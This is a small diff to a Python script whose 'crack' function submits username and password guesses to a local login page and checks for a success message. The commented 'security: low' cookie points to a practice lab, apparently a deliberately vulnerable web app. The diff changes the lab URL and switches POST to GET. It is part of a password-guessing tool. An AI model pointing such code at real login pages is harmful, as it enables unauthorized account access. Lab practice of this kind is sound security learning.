@@ -1,7 +1,7 @@
 import requests
 
 def crack(usr, pwd):
-    url = f'http://localhost/page.php'
+    url = f'http://localhost/lab1'
     #cookies = {
     #    "security": "low",
     #    "PHPSESSID": "pdsgk72dnc5bs6dh95mknadf34"    
@@ -11,7 +11,7 @@ def crack(usr, pwd):
         "password": pwd,
         "Login": "Login"    
     }
-    r = requests.post(url, params)#, cookies=cookies)
+    r = requests.get(url, params)#, cookies=cookies)
     #fail = f"Username and/or password incorrect."
     success = f"Welcome to the password protected area"
     if success in r.text:
